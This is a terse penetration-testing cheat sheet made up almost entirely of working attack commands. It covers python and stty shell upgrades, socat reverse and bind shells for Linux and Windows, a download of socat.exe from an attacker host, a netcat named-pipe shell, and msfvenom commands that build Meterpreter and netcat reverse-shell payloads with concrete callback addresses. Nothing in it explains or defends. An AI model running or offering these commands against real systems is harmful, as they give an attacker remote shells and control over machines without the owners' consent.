# updog
pip3 install updog
updog -d /tmp -p 1234
php -S localhost:9000 -t PATH

# python
python -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
background the shell using Ctrl + Z && stty raw -echo; fg
stty -a
stty row "x" cols "x"

# rlwrap
rlwrap nc -lvnp <port>
background the shell using Ctrl + Z && stty raw -echo; fg
stty -a
stty row "x" cols "x"

# TTY
script /dev/null -c bash
mkfifo input; tail -f input | /bin/bash > output

# socat
# Reverse Shells 
Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe

socat TCP-L:<port> -
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes # windows
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li" # linux

# Bind Shells
socat TCP-L:<PORT> EXEC:"bash -li"
socat TCP-L:<PORT> EXEC:powershell.exe,pipes
socat TCP:<TARGET-IP>:<TARGET-PORT> -
socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane

# listeners
mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f

# msfvenom
msfvenom -p linux/x64/meterpreter_reverse_tcp -f elf -o shell LHOST=10.10.10.5 LPORT=443
msfvenom -p cmd/unix/reverse_netcat LHOST=10.11.41.181 LPORT=8888 R

